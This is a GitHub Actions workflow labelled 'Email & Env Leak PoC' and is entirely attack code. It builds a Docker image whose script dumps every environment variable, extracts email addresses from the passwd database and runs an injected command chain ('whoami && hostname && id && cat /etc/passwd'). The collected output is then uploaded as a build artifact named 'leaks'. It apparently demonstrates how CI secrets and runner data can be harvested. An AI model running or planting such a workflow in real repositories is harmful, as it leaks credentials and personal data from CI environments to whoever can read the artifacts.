name: Email & Env Leak PoC

on:
  push:
    branches: [ main ]

jobs:
  leak:
    runs-on: ubuntu-latest
    permissions:
      contents: read  # Minimum needed for this PoC

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup Dockerfile and Leak Payload
        id: prepare
        run: |
          mkdir -p ./taskcluster/docker/python

          cat <<'EOF' > ./taskcluster/docker/python/Dockerfile
          FROM python:3.11-alpine

          ARG PAYLOAD

          RUN apk add --no-cache curl bash

          RUN echo "[+] Collecting sensitive data..." && \
              echo '#!/bin/bash' > /leak.sh && \
              echo 'echo "[+] ENVIRONMENT VARIABLES:"' >> /leak.sh && \
              echo 'printenv' >> /leak.sh && \
              echo 'echo "[+] COMMON GITHUB CONTEXT:"' >> /leak.sh && \
              echo 'echo "Actor: $GITHUB_ACTOR"' >> /leak.sh && \
              echo 'echo "Repository: $GITHUB_REPOSITORY"' >> /leak.sh && \
              echo 'echo \"User Email: $(getent passwd | grep -Eo \"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}\")\"' >> /leak.sh && \
              echo 'echo "[+] Injected payload:"' >> /leak.sh && \
              echo "$PAYLOAD" >> /leak.sh && \
              chmod +x /leak.sh && \
              /leak.sh > /leaks.txt

          CMD ["cat", "/leaks.txt"]
          EOF

          echo "MALICIOUS_PAYLOAD=whoami && hostname && id && cat /etc/passwd" >> "$GITHUB_OUTPUT"

      - name: Build and run malicious Docker image
        run: |
          docker build \
            --build-arg PAYLOAD="${{ steps.prepare.outputs.MALICIOUS_PAYLOAD }}" \
            -t envleak \
            ./taskcluster/docker/python

          docker run --rm envleak > leaks.txt

      - name: Upload leaked data
        uses: actions/upload-artifact@v4
        with:
          name: leaks
          path: leaks.txt
